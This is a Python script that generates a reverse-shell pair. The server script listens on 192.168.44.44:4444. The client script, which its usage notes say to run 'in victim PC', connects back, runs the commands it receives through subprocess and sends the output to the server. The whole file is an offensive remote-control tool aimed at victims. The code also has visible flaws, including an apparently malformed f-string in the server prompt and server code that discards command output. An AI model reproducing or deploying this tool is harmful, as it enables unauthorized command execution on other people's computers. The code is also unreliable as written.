import os.path
from time import sleep
from termcolor import colored


def generate_payload():
    server_reverse_shell_code = """
'''
How to use this payload:
1) Run "ServerShell" file
2) Run "ClientShell" file in victim PC and write server IP
3) Wait for connecting to server
4) Write commands. To exit the shell just write cmd "exit"!)
'''
import socket
from termcolor import colored

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("192.168.44.44", 4444))
print(colored("[*] Listening for connecting...", "yellow"))
server.listen()
conn, addr = server.accept()
client_name = (conn.recv(1024)).decode()
print(colored(f"[+] {client_name} connected!", "green"))
while True:
    cmd = input(colored(f"{client_name}㉿{4444}--[Command]:~{ ", "cyan"))
    if cmd == "exit":
        break
    conn.send(cmd.encode())
    response = conn.recv(4096).decode(errors="ignore")
server.close()
"""
    client_reverse_shell_code = """
'''
How to use this payload:
1) Run "server_shell" file
2) Run "client_shell" file in victim PC and write server IP
3) Wait for connecting to server
4) Write commands. To exit the shell just write cmd "exit"!)
'''
import socket
import subprocess
from termcolor import colored

def getIP():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8', 80))
    IP = sock.getsockname()[0]
    sock.close()
    return IP

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.44.44", 4444))
print(colored("[*] Connecting to server...", "yellow"))
client.send(getIP().encode())
print(colored(f"[+] Connected to server!", "green"))
cmd = client.recv(4096).decode()
while cmd != "exit":
    proc = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result, err = proc.communicate()
    client.send(result)
    cmd = (client.recv(4096)).decode()
client.close()      
"""
    # Server
    print(colored("[*] Generating reverse-shell payload for server...", "yellow"))
    sleep(1)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, "server_shell.py")
    with open(file_path, "w", encoding="utf-8") as server_reverse_shell:
        server_reverse_shell.writelines(server_reverse_shell_code)
        print(colored("[+] Payload was generated!", "green"))
    # Client
    print(colored("[*] Generating reverse-shell payload for client...", "yellow"))
    sleep(1)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, "client_shell.py")
    with open(file_path, "w", encoding="utf-8") as client_reverse_shell:
        client_reverse_shell.writelines(client_reverse_shell_code)
        print(colored("[+] Payload was generated!", "green"))